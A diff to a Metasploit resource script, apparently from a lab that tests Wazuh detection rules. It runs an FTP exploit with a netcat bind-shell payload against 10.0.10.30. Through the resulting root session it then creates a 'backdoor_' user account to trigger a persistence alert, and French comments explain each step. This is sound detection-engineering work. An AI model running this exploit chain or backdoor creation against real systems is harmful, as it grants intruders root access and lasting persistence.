@@ -26,7 +26,16 @@ set RPORT 21
 set PAYLOAD cmd/unix/bind_netcat
 set RHOST 10.0.10.30
 set LPORT 6201
-run
+run -j
 
+# Persistance (T1136.001) -- genere l'evenement detecte par D2 (Wazuh 100055 via
+# forward syslog + decodeur custom metasploitable-useradd). run -j lance l'exploit
+# en arriere-plan (evite de bloquer dans le shell interactif) ; sleep 5 laisse la
+# session s'etablir. Nom base sur date +%s : unique a chaque run (pas de collision
+# useradd). -i 1 : script concu pour un lancement a froid (msfconsole -r attack.rc),
+# ou la session est toujours n1. Le shell est root (uid=0), donc useradd reussit.
+sleep 5
 sessions -l
+sessions -c "u=backdoor_$(date +%s); useradd -m -s /bin/bash $u; id $u" -i 1
+
 spool off
